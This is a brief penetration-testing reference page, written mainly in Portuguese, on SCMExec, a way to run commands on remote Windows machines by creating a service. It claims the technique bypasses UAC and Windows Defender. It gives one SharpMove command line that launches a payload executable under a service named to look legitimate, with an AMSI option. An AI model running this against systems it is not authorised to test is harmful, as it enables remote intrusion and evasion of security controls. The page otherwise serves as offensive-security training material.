# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** é uma técnica para executar comandos em sistemas remotos usando o Gerenciador de Controle de Serviços (SCM) para criar um serviço que executa o comando. Este método pode contornar alguns controles de segurança, como o Controle de Conta de Usuário (UAC) e o Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
